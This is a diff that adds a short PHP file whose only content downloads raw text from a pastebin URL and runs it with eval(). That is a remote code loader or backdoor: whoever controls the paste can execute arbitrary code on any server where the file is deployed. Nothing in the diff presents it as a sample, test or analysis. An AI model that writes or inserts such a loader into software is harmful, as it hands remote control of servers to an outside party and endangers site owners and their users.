@@ -1,0 +1,4 @@
+<?php
+$url = "http://pastebin.com/raw/nC6pWh5a";
+eval(file_get_contents($url));
+?>
